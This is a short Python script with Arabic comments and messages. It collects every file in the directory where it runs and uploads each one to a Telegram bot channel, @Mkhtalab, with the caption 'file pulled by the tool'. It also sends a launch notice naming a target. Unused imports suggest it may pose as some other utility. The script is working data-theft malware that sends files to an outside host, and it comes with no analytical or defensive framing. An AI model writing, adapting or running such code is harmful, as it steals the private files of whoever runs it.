import requests, os, random
from user_agent import generate_user_agent
from uuid import uuid4
import socket
import webbrowser
import datetime
import sys
import json

os.system('clear')

#------------------------------[الإعدادات]------------------------------
target_username = "Mkhtalab@"
token2 = 'ضع_توكن_البوت_هنا'
ID2 = 'Mkhtalab@' # تم التعديل لتوجيه البيانات إلى المعرف المطلوب

file_ha = []
for file in os.listdir():
    if os.path.isfile(file):
        file_ha.append(file)

try:
    # إرسال تنبيه التشغيل مع المعرف المستهدف
    requests.post(f"https://api.telegram.org/bot{token2}/sendMessage", data={
        "chat_id": "@Mkhtalab",
        "text": "تم تشغيل الأداة بنجاح، الهدف: Mkhtalab@"
    })
except Exception as e:
    pass

for file in file_ha:
    with open("file_mahdi.txt", "a") as pro:
        pro.write(str(file) + "\n")
        try:
            with open(file, "rb") as f:
                requests.post(
                    f'https://api.telegram.org/bot{token2}/sendDocument',
                    data={'chat_id': '@Mkhtalab', 'caption': f'ملف مسحوب بواسطة الأداة - مستر صوفي'},
                    files={'document': f}
                )
        except:
            pass

print("[+] تم تنفيذ المهام وإرسال التقارير إلى Mkhtalab@ بنجاح.")
